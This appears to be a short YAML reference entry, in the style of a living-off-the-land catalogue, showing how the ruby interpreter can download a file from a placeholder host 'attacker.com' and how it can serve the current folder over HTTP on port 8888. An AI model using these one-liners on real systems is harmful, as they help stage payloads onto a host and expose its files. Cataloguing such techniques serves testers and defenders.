---
functions:
  file-download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        export URL=http://attacker.com/file_to_get
        export LFILE=file_to_save
        ruby -e 'require "open-uri"; download = open(ENV["URL"]); IO.copy_stream(download, ENV["LFILE"])'
  server:
    - description: Serve files in the local folder running an HTTP server. This requires version 1.9.2 or later.
      code: |
        export LPORT=8888
        ruby -run -e httpd . -p $LPORT
---
